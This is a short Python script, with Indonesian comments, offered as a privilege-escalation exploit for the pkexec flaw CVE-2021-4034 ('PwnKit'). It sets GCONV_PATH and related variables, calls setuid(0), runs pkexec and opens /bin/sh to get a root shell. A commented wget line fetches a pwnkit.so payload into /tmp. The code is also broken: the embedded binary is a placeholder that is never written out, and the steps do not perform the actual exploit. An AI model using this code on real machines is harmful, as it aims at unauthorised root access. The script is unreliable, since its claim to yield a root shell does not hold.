#!/usr/bin/env python3
# CVE-2021-4034 - PwnKit - Pure Python
# github: https://github.com/ly4k/PwnKit
import os
import sys
import ctypes

libc = ctypes.CDLL("libc.so.6")
NULL = ctypes.c_void_p(0)

if not os.path.exists("/tmp/pwnkit.so"):
    so = b"""
    \x7fELF...<LONG BINARY DATA>...
    """
    # Untuk script real, gunakan file pwnkit.so dari repo asli (lihat note bawah)
    # atau download langsung:
    # wget https://raw.githubusercontent.com/ly4k/PwnKit/main/pwnkit.so -O /tmp/pwnkit.so

os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
os.environ["LC_ALL"] = "C"
os.environ["CHARSET"] = "UTF-8"
os.environ["GCONV_PATH"] = "/tmp"
os.environ["SHELL"] = "/bin/sh"
os.environ["PKEXEC_PATH"] = "/usr/bin/pkexec"

if os.path.exists("/usr/bin/pkexec"):
    libc.setuid(0)
    os.system("/usr/bin/pkexec --version")
    # Will spawn root shell if vulnerable

os.system("/bin/sh")
